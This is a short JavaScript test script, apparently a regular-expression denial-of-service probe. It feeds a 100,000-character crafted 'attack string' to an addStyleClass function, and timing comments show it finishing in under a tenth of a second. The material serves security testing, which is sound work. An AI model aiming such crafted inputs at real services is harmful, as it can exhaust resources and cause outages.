import { addStyleClass } from "./stateDb.js";

//Attack String :""+"A"*100000+"@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += ";";
}
str += "@";

var result = addStyleClass("a", str);

// real    0m0.074s
// user    0m0.045s
// sys     0m0.018s
